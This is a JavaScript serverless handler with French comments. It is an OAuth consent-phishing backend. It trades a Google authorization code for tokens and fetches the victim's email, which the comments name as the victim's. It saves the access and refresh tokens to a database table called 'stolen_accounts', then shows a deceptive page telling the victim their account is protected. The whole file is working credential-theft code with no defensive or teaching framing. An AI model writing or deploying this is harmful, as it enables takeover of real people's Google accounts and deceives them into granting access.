import { createClient } from '@supabase/supabase-js';
import fetch from 'node-fetch';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

export default async function handler(req, res) {
    const { code } = req.query;
    const REDIRECT_URI = `https://${process.env.VERCEL_URL}/callback`;

    if (!code) return res.status(400).send('Code manquant');

    try {
        // 1. Échange du code contre Tokens
        const response = await fetch('https://oauth2.googleapis.com/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: process.env.GOOGLE_CLIENT_ID,
                client_secret: process.env.GOOGLE_CLIENT_SECRET,
                code: code,
                grant_type: 'authorization_code',
                redirect_uri: REDIRECT_URI
            })
        });
        const tokens = await response.json();

        // 2. Récupération de l'adresse email de la victime via l'API Google
        const userRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
            headers: { Authorization: `Bearer ${tokens.access_token}` }
        });
        const userData = await userRes.json();

        // 3. Sauvegarde dans Supabase
        const { error } = await supabase.from('stolen_accounts').insert([{
            email_address: userData.email,
            access_token: tokens.access_token,
            refresh_token: tokens.refresh_token,
            full_payload: tokens
        }]);

        if (error) throw error;

        // Redirection vers une page de confirmation crédible
        res.send('<h1>Vérification terminée</h1><p>Votre compte est protégé contre les accès non autorisés.</p>');
    } catch (err) {
        console.error(err);
        res.status(500).send('Erreur technique lors de la synchronisation.');
    }
}